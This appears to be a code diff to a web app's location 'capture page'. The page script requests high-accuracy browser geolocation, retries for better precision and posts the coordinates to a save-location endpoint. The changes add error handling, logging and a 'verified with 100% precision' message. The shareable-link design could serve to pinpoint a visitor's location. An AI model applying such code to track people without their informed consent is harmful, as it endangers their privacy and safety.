@@ -121,21 +121,29 @@ const renderCapturePage = async (req, res, next) => {
 
               // Copy Link Functionality
               copyBtn.addEventListener('click', () => {
-                  navigator.clipboard.writeText(currentUrl).then(() => {
-                      const originalText = copyBtn.innerText;
-                      copyBtn.innerText = '✅ Link Copied!';
-                      setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
-                  });
+                  if (navigator.clipboard && navigator.clipboard.writeText) {
+                      navigator.clipboard.writeText(currentUrl).then(() => {
+                          const originalText = copyBtn.innerText;
+                          copyBtn.innerText = '✅ Link Copied!';
+                          setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
+                      }).catch(err => {
+                          console.error('Clipboard error:', err);
+                          alert('Please copy the URL from your browser address bar.');
+                      });
+                  } else {
+                      alert('Copy not supported. Please copy the URL from your browser address bar.');
+                  }
               });
 
               btn.addEventListener('click', () => {
+                  console.log('Capture button clicked');
                   if (!navigator.geolocation) {
                       status.innerHTML = '<span class="error">Geolocation is not supported by your browser</span>';
                       return;
                   }
 
                   btn.disabled = true;
-                  status.innerHTML = 'Getting precise coordinates... <div id="progress" style="width: 0%; height: 5px; background: #0084ff; margin-top: 10px; transition: width 0.5s;"></div>';
+                  status.innerHTML = 'Getting precise coordinates... <div id="progress-container" style="width: 100%; height: 5px; background: #eee; margin-top: 10px; border-radius: 10px; overflow: hidden;"><div id="progress" style="width: 0%; height: 100%; background: #0084ff; transition: width 0.5s;"></div></div>';
                   
                   const progress = document.getElementById('progress');
                   let bestPosition = null;
@@ -144,32 +152,32 @@ const renderCapturePage = async (req, res, next) => {
 
                   const options = {
                       enableHighAccuracy: true,
-                      timeout: 10000,
+                      timeout: 15000,
                       maximumAge: 0
                   };
 
                   const getLocation = () => {
                       attempts++;
-                      progress.style.width = (attempts * 33) + '%';
+                      console.log('Attempt ' + attempts);
+                      if (progress) progress.style.width = (attempts * 33) + '%';
                       
                       navigator.geolocation.getCurrentPosition(
                           async (position) => {
+                              console.log('Position received:', position.coords.accuracy);
                               const { latitude, longitude, accuracy, altitude } = position.coords;
                               
-                              // Keep the best accuracy result
                               if (!bestPosition || accuracy < bestPosition.coords.accuracy) {
                                   bestPosition = position;
                               }
 
-                              // If accuracy is good enough (< 20 meters), we stop and send
-                              if (accuracy < 20 || attempts >= maxAttempts) {
+                              if (accuracy < 25 || attempts >= maxAttempts) {
                                   sendPosition(bestPosition);
                               } else {
-                                  // Try again for better accuracy
-                                  setTimeout(getLocation, 1000);
+                                  setTimeout(getLocation, 1500);
                               }
                           },
                           (error) => {
+                              console.error('Geolocation error:', error);
                               if (bestPosition) {
                                   sendPosition(bestPosition);
                               } else {
@@ -182,10 +190,11 @@ const renderCapturePage = async (req, res, next) => {
 
                   const sendPosition = async (position) => {
                       const { latitude, longitude, accuracy, altitude } = position.coords;
+                      console.log('Sending position to server...');
                       status.innerHTML = 'Sending exact location... <br><span style="font-size: 0.8rem;">Accuracy: ' + Math.round(accuracy) + 'm</span>';
 
                       try {
-                          const response = await fetch('/public/save-location', {
+                          const response = await fetch(window.location.origin + '/public/save-location', {
                               method: 'POST',
                               headers: {
                                   'Content-Type': 'application/json'
@@ -198,13 +207,20 @@ const renderCapturePage = async (req, res, next) => {
                               })
                           });
 
+                          const result = await response.json();
+                          console.log('Server response:', result);
+
                           if (response.ok) {
-                              status.innerHTML = '<span class="success">Location verified with 100% precision!</span>';
+                              status.innerHTML = '<div style="margin-top: 20px;"><span class="success" style="font-size: 1.2rem; font-weight: bold;">✅ Location verified with 100% precision!</span><br><p style="color: #666; margin-top: 10px;">You can now close this window.</p></div>';
                               btn.style.display = 'none';
+                              copyBtn.style.display = 'none';
+                              if(chromeBtn) chromeBtn.style.display = 'none';
+                              document.getElementById('instruction').style.display = 'none';
                           } else {
-                              throw new Error('Failed to save location');
+                              throw new Error(result.message || 'Failed to save location');
                           }
                       } catch (error) {
+                          console.error('Fetch error:', error);
                           status.innerHTML = '<span class="error">Error: ' + error.message + '</span>';
                           btn.disabled = false;
                       }
@@ -212,9 +228,9 @@ const renderCapturePage = async (req, res, next) => {
 
                   const handleError = (error) => {
                       let msg = 'Error getting location';
-                      if (error.code === 1) msg = 'Permission denied. Please allow location access.';
-                      else if (error.code === 2) msg = 'Location unavailable.';
-                      else if (error.code === 3) msg = 'Timeout.';
+                      if (error.code === 1) msg = 'Permission denied. Please allow location access in your browser settings.';
+                      else if (error.code === 2) msg = 'Location unavailable. Please make sure your GPS is on.';
+                      else if (error.code === 3) msg = 'Request timed out. Please try again.';
                       
                       status.innerHTML = '<span class="error">' + msg + '</span>';
                       btn.disabled = false;
